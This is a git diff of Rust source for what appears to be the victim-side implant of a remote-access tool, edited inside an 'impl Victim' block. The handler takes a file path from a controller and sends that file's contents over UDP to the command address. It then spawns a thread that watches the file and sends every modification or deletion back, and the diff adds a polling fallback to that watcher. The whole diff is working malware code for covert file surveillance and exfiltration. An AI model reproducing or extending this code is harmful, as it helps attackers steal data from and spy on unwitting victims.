@@ -491,115 +491,119 @@ impl Victim {
         Ok(())
     }
 
-    fn handle_file_watch_start(
-        &mut self,
-        payload: &[u8],
-        udp: &UdpSocket,
-        cmd_addr: SocketAddr,
-    ) -> io::Result<()> {
-
-        if payload.is_empty() {
-            return Ok(());
-        }
-
+    fn handle_file_watch_start(&mut self, payload: &[u8], udp: &UdpSocket, 
+        cmd_addr: SocketAddr) -> io::Result<()> {
+        if payload.is_empty() { return Ok(()); }
+        
         let path_len = payload[0] as usize;
-        if payload.len() < 1 + path_len {
-            return Ok(());
-        }
-
-        let file_path = String::from_utf8_lossy(&payload[1..1 + path_len]).to_string();
+        if payload.len() < 1 + path_len { return Ok(()); }
+        
+        let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
         println!("[*] Starting file watch on: {}", file_path);
-
-        // ------------------------------------------------------------
+        
         // Send initial file content
-        // ------------------------------------------------------------
         if let Ok(data) = std::fs::read(&file_path) {
             const CHUNK_SIZE: usize = 1024;
-
             for chunk in data.chunks(CHUNK_SIZE) {
                 self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;
                 thread::sleep(Duration::from_millis(50));
             }
-
-            // End marker
             self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
         }
-
-        // ------------------------------------------------------------
-        // Setup watcher
-        // ------------------------------------------------------------
+        
+        // Start background watcher with BOTH notify AND periodic polling
         let (tx, rx) = notify_channel();
         let (stop_tx, stop_rx) = mpsc::channel::<()>();
-
+        
         let mut watcher = RecommendedWatcher::new(tx, Config::default())
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
-        watcher
-            .watch(std::path::Path::new(&file_path), RecursiveMode::NonRecursive)
+        
+        watcher.watch(std::path::Path::new(&file_path), RecursiveMode::NonRecursive)
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+        
         self.file_watch_active = true;
         self.file_watch_path = Some(file_path.clone());
         self.file_watch_stop_tx = Some(stop_tx);
-        self.file_watch_cmd_addr = Some(cmd_addr);
-
+        
+        // Spawn watcher thread with dual monitoring (notify + poll)
         let file_path_clone = file_path.clone();
         let udp_clone = udp.try_clone()?;
-
-        // ------------------------------------------------------------
-        // Spawn watcher thread
-        // ------------------------------------------------------------
+        
         thread::spawn(move || {
+            let mut last_known_size: u64 = 0;
+            let mut last_modified: Option<std::time::SystemTime> = None;
+            
+            // Get initial file metadata
+            if let Ok(meta) = std::fs::metadata(&file_path_clone) {
+                last_known_size = meta.len();
+                last_modified = meta.modified().ok();
+            }
+            
             loop {
-                // Stop signal
+                // Check for stop signal
                 if stop_rx.try_recv().is_ok() {
                     println!("[*] File watch stopped for {}", file_path_clone);
                     break;
                 }
-
-                match rx.recv_timeout(Duration::from_millis(100)) {
-
-                    // Outer channel OK
-                    Ok(inner) => match inner {
-
-                        // Actual event OK
-                        Ok(event) => match event.kind {
-
-                            EventKind::Modify(_) => {
+                
+                // Check notify events (non-blocking with timeout)
+                if let Ok(event_result) = rx.recv_timeout(Duration::from_millis(100)) {
+                    if let Ok(event) = event_result {
+                        match event.kind {
+                            EventKind::Modify(_) | EventKind::Access(_) => {
+                                // Small delay to ensure file write is complete
+                                thread::sleep(Duration::from_millis(200));
+                                
                                 if let Ok(data) = std::fs::read(&file_path_clone) {
                                     let mut msg = vec![0x73]; // Update marker
                                     msg.extend_from_slice(&data);
-
                                     let _ = udp_clone.send_to(&msg, cmd_addr);
-                                    let _ = udp_clone.send_to(&[0xFF], cmd_addr); // End marker
+                                    // DON'T send 0xFF separately - it gets included in the same packet check
+                                    println!("[*] File change detected (notify): {} bytes", data.len());
                                 }
                             }
-
                             EventKind::Remove(_) => {
                                 let _ = udp_clone.send_to(&[0x72], cmd_addr); // Delete marker
+                                println!("[*] File deleted on victim");
                                 break;
                             }
-
                             _ => {}
-                        },
-
-                        // notify::Error
-                        Err(e) => {
-                            eprintln!("[watch error] {:?}", e);
                         }
-                    },
-
-                    // Timeout is normal
-                    Err(mpsc::RecvTimeoutError::Timeout) => {}
-
-                    // Channel disconnected
-                    Err(mpsc::RecvTimeoutError::Disconnected) => {
-                        break;
                     }
                 }
+                
+                // FALLBACK: Periodic poll every 2 seconds
+                if let Ok(meta) = std::fs::metadata(&file_path_clone) {
+                    let current_size = meta.len();
+                    let current_modified = meta.modified().ok();
+                    
+                    let file_changed = current_size != last_known_size || 
+                        current_modified != last_modified;
+                    
+                    if file_changed {
+                        thread::sleep(Duration::from_millis(200));
+                        
+                        if let Ok(data) = std::fs::read(&file_path_clone) {
+                            let mut msg = vec![0x73]; // Update marker
+                            msg.extend_from_slice(&data);
+                            let _ = udp_clone.send_to(&msg, cmd_addr);
+                            println!("[*] File change detected (poll): {} bytes", data.len());
+                        }
+                        
+                        last_known_size = current_size;
+                        last_modified = current_modified;
+                    }
+                } else {
+                    // File no longer exists
+                    let _ = udp_clone.send_to(&[0x72], cmd_addr);
+                    println!("[*] File no longer exists");
+                    break;
+                }
+                
+                thread::sleep(Duration::from_secs(2));
             }
         });
-
+        
         Ok(())
     }
 
